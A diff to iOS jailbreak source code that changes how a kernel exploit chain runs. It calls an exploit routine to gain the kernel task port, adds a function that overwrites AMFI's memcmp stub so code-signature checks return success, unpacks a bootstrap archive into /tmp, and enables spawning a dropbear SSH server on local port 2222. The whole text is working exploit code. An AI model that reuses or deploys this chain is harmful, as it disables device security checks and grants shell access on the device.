@@ -38,6 +38,7 @@
 
 #include "kppless.h"
 #include "amfi.h"
+#include "libmis.h"
 #include "patchfinder64.h"
 
 // For '/' remount (not offsets)
@@ -113,6 +114,17 @@ int remount_rw(task_t tfp0, vm_address_t kbase) {
 }
 
 
+int amfid(){
+    
+    //amfid
+    uint64_t memcmp_got = find_amfi_memcmpstub();
+    uint64_t ret1 = find_ret_0();
+    
+    //RemapPage(memcmp_got);
+    WriteAnywhere64(ReadAnywhere64(memcmp_got), ret1);
+    return 0;
+}
+
 static int party_hard(void)
 {
     int ret = -1;
@@ -120,32 +132,25 @@ static int party_hard(void)
     {
         vm_address_t kernel_base = 0;
         // get tfp0
-        task_t kernel_task = exploit64();
-        LOG("kernel_task: 0x%x", kernel_task);
+        task_t tfp0 = exploit64();
+        LOG("kernel_task: 0x%x", tfp0);
         // find kernel base
-        kernel_base = find_kernel_base(kernel_task);
-        printf("kernel base:  0x%x\n", kernel_base);
+        kernel_base = find_kernel_base(tfp0);
+        LOG("kernel base:  0x%x\n", kernel_base);
         // initialize patchfinder64 & amfi stuff, need to patch for iOS < 10, just commit now
-         init_patchfinder(NULL, kernel_base);
-         init_amfi();
+        // init_patchfinder(NULL, kernel_base);
+        // init_amfi();
         // remount root partition as r/w
-        ret = remount_rw(kernel_task, kernel_base); //do not work, operation not permitted
+        // ret = remount_rw(tfp0, kernel_base); //do not work, operation not permitted
+        //amfid();
     }
-    return ret;
+    return 0;
 }
 
 
 bool jailbreak(void){
-    
-    
-    NSString *ver = [[NSProcessInfo processInfo] operatingSystemVersionString];
-    
-    struct utsname u;
-    uname(&u);
-    LOG("Device Name: %s", u.version);
-    LOG("Device: %s", u.machine);
-    LOG("iOS Version: %@", ver);
-    
+    printf("-----------------------------------\n");
+    LOG("start jailbreaking");
     if(party_hard() == 0){
         
         char path[4096];
@@ -188,11 +193,13 @@ bool jailbreak(void){
         //inject_trust("/tmp/dropbear-sig");
         
         /* using untar function to unzip bootstrap.tar */
-        printf("untar and drop bootstrap.tar into /tmp\n");
+        LOG("untar and drop bootstrap.tar into /tmp\n");
         FILE *a = fopen([bootstrap UTF8String], "rb");
         chdir("/tmp");
         untar(a, "bootstrap");
         fclose(a);
+        
+        //printf("misvalid is ok = %d\n",libmis("/tmp/dropbear-sig"));
         
         /* getshell */
         
@@ -207,11 +214,11 @@ bool jailbreak(void){
          */
         
         //launch dropbear
-        /*
-         posix_spawn(&pd, "/tmp/dropbear-sig", NULL, NULL, (char **)&(const char*[]){ "/tmp/dropbear-sig", "-RE", "-p", "127.0.0.1:2222",NULL }, NULL);
-         NSLog(@"pid = %x", pd);
-         waitpid(pd, NULL, 0);
-         */
+        int pd;
+        posix_spawn(&pd, "/tmp/dropbear-sig", NULL, NULL, (char **)&(const char*[]){ "/tmp/dropbear-sig", "-RE", "-p", "127.0.0.1:2222",NULL }, NULL);
+        LOG(@"pid = %x", pd);
+        waitpid(pd, NULL, 0);
+        
         
         return 0;
         
